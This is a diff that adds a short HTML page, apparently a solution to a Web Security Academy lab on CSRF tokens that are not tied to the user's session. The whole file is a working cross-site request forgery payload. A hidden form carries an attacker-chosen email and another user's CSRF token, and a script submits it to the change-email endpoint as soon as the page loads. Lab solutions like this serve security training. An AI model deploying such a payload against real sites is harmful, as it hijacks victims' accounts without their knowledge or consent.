@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en" xml:lang="en">
+
+<head>
+    <title>CSRF where token is not tied to user session</title>
+</head>
+
+<body>
+    <form action="https://INSTANCEID.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="attacked@normal-user.net" />
+        <input type="hidden" name="csrf" value="CSRF_TOKEN_OF_OTHER_USER" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
